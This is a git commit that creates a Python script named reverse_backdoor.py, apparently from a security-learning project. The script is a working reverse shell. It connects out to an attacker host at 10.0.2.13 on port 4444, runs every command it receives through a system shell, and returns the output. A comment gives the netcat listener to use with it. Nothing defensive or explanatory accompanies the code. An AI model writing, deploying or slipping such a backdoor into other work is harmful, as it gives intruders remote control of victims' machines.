dc1619ec0151807110bb00ef24546821b04f21ba
Robert Paruch <roobbb@live.com>
2020-07-14 17:22:12 -0700

    Create reverse_backdoor.py

---
+++ reverse_backdoor/reverse_backdoor.py
@@ -0,0 +1,22 @@
+# nc -vv -l -p 4444
+
+import socket
+import subprocess
+
+
+def execute_system_command(command):
+    return subprocess.check_output(command, shell=True)
+
+
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.connect(('10.0.2.13', 4444))
+
+sent_data = '\n[+] Connection established.\n'.encode()
+connection.send(sent_data)
+
+while True:
+    command = connection.recv(1024).decode()
+    command_result = execute_system_command(command)
+    connection.send(command_result)
+
+connection.close()
